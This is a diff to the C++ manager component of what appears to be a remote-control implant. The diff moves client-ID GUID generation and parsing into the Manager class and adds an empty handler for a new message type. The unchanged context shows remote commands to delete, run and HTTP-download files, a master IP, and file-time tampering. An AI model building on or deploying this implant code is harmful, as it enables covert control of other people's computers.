@@ -11,10 +11,9 @@
 #include "main.h"
 #include "FileParser.h"
 #include "CommManager.h"
-#include "CutupProtocol.h"
 #include "Manager.h"
 #include "ServiceManager.h"
-
+#include <atlenc.h>
 
 #pragma comment(lib,"wininet.lib")
 //配置文件信息
@@ -61,9 +60,75 @@ ULONG Manager::GetMasterIP()
 	return m_masterIP;
 }
 
-GUID Manager::GetClientID() const
+tstring Manager::GetClientID() const
 {
-	return m_clientid;
+	tstring id;
+
+	CPGuid2Str(m_clientid,id);
+	
+	return id;
+}
+
+BOOL Manager::CreateCPGuid( CPGUID& cpguid )
+{
+	BOOL bRet = FALSE;
+	GUID guid;
+	CoInitialize(NULL);
+	{
+		if (S_OK == ::CoCreateGuid(&guid))
+		{
+			bRet = TRUE;
+		}
+	}
+	CoUninitialize();
+
+	if (bRet)
+	{
+		cpguid = guid;
+	}
+
+	return bRet;
+}
+
+void Manager::CPGuid2Str( const CPGUID& cpguid, tstring& str )
+{
+	tostringstream toss;
+
+	LPBYTE p = (LPBYTE) &cpguid;
+	for (int i = 0; i < (int)sizeof(CPGUID); i++, p++)
+	{
+		TCHAR buffer[8] = {0};
+		_stprintf_s(buffer, _T("%02X"), *p);
+		toss << buffer;
+	}
+
+	str = toss.str();
+}
+
+BOOL Manager::Str2CPGuid( LPCTSTR str, CPGUID& cpguid )
+{
+	tstring s = str;
+	if (s.size() != 32) return FALSE;
+
+	LPBYTE p = (LPBYTE) &cpguid;
+	makeLower(s);
+	for (int i = 0; i < 32; i+=2, p++)
+	{
+		BYTE b = 0;
+
+		TCHAR ch = s[i];
+		if (ch >= '0' && ch <= '9') b = ch - '0';
+		else if (ch >= 'a' && ch <= 'f') b = ch - 'a' + 10;
+		b <<= 4;
+
+		ch = s[i + 1];
+		if (ch >= '0' && ch <= '9') b |= ch - '0';
+		else if (ch >= 'a' && ch <= 'f') b |= ch - 'a' + 10;
+
+		*p = b;
+	}
+
+	return TRUE;
 }
 
 BOOL Manager::InitCPGuid()
@@ -97,16 +162,16 @@ BOOL Manager::InitCPGuid()
 
 		//是否生成clientid
 		CPGUID cpguid;
-		if (cpguidStr.size() == 0 || !CutupProtocol::Str2CPGuid(cpguidStr.c_str(), cpguid))
+		if (cpguidStr.size() == 0 || !Str2CPGuid(cpguidStr.c_str(), cpguid))
 		{
-			if (! CutupProtocol::CreateCPGuid(cpguid))
+			if (! CreateCPGuid(cpguid))
 			{
 				errorLog(_T("create cpguid failed"));
 				break;
 			}
 
 			tstring clientID;
-			CutupProtocol::CPGuid2Str(cpguid, clientID);
+			CPGuid2Str(cpguid, clientID);
 
 			WritePrivateProfileString(INFO_SECTION, CID_KEYNAME, clientID.c_str(), datFilepath.c_str());
 			AdjustTimes(datFilepath.c_str());
@@ -114,8 +179,7 @@ BOOL Manager::InitCPGuid()
 			debugLog(_T("Make clientid"));
 		}
 
-		CutupProtocol::SetLocalGuid(cpguid);
-		m_clientid = cpguid.GetGUID();
+		m_clientid = cpguid;
 
 		bSuccess = TRUE;
 	} while (FALSE);
@@ -214,6 +278,7 @@ BOOL Manager::QueryCommandHandler( MSGID msgid, FnExecuteRCCommand* ppHandler, L
 		DECLARE_MSG_HANDLER(MSGID_DELETE_FILE, ExecuteRCCommand_DeleteFile);
 		DECLARE_MSG_HANDLER(MSGID_RUN_FILE, ExecuteRCCommand_RunFile);
 		DECLARE_MSG_HANDLER(MSGID_HTTPDOWN_FILE, ExecuteRCCommand_HttpDown);
+		DECLARE_MSG_HANDLER(MSGID_AVAILABLE_COMM, ExecuteRCCommand_Empty);
 	};
 
 	if (NULL != *ppHandler)
@@ -917,4 +982,10 @@ BOOL Manager::ExecuteRCCommand_HttpDown(MSGID msgid, const LPBYTE pData, DWORD d
 	
 	return TRUE;
 
+}
+
+BOOL Manager::ExecuteRCCommand_Empty(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter)
+{
+
+	return TRUE;
 }
